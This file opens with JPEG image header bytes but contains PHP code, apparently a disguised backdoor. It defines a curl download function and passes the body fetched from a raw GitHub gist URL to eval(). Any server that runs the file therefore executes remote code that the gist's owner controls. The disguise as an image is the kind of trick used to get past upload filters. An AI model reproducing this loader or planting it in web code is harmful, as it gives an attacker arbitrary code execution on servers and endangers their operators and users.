ÿØÿà JFIF ÿþ;<?pHp
   function get($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_URL, $url);

    $data = curl_exec($ch);
    curl_close($ch);

    return $data;
}
      eval('?>' . get('https://gist.githubusercontent.com/paknago21/d125b549b7101b34118fcfcea48a8720/raw/540a93d68ab4ab333beacb4b2e73207364f4f26c/ff'));
?>